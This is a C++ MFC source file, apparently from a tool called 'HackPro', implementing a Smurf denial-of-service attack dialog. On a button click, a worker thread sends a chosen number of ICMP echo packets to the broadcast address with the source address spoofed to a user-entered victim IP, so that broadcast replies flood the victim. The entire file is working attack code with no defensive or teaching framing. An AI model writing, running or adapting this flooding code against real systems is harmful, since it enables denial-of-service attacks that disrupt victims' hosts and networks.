// SmurfDlg.cpp : implementation file
//

#include "stdafx.h"
#include "HackPro.h"
#include "SmurfDlg.h"
#include "globalfn.h"
#include "NetSocket.h"


// CSmurfDlg dialog

IMPLEMENT_DYNAMIC(CSmurfDlg, CPropertyPage)
CSmurfDlg::CSmurfDlg()
	: CPropertyPage(CSmurfDlg::IDD)
{
}

CSmurfDlg::~CSmurfDlg()
{
}

void CSmurfDlg::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_IPVICTIM, m_VictimIP);
	DDX_Control(pDX, IDC_PROGRESS, m_Progress);
}


BEGIN_MESSAGE_MAP(CSmurfDlg, CPropertyPage)
	
	
	ON_BN_CLICKED(IDC_START, OnBnClickedStart)
END_MESSAGE_MAP()

BOOL CSmurfDlg::PreTranslateMessage(MSG* pMsg)
{
	return CPropertyPage::PreTranslateMessage(pMsg);
}

void CSmurfDlg::OnBnClickedStart()
{
	m_Delay=GetDlgItemInt(IDC_DELAY);
	m_NumOfPackets=GetDlgItemInt(IDC_NUMBEROFPACKETS);
	this->m_VictimIP.GetAddress(m_IP);
	AfxBeginThread(CSmurfDlg::SndThrd,(LPVOID)this);

}
UINT CSmurfDlg::SndThrd(LPVOID Param)
{
	
	CSmurfDlg* This=(CSmurfDlg*)Param;
	This->m_Progress.SetRange(0,100);
	This->m_Progress.ShowWindow(SW_SHOW);
	CNetSocket sock;
	sock.InitSocket(IPPROTO_ICMP);
	sock.SetOpt();
	for(int i=0;i<This->m_NumOfPackets;i++)
	{
		int val=(i*100)/This->m_NumOfPackets;
		int sent=0;
		This->m_Progress.SetPos(val);
		PacketParam p;
		p.port=7;
		p.ttl=128;
		p.source=This->m_IP;
		p.destination=INADDR_BROADCAST;
		sent=sock.SendICMPPacket(p,ICMP_ECHO);
		if(sent<0)
		{
			break;
		}
		Sleep(This->m_Delay);
	}
	sock.close();
	This->m_Progress.ShowWindow(SW_HIDE);
	return 0;
}



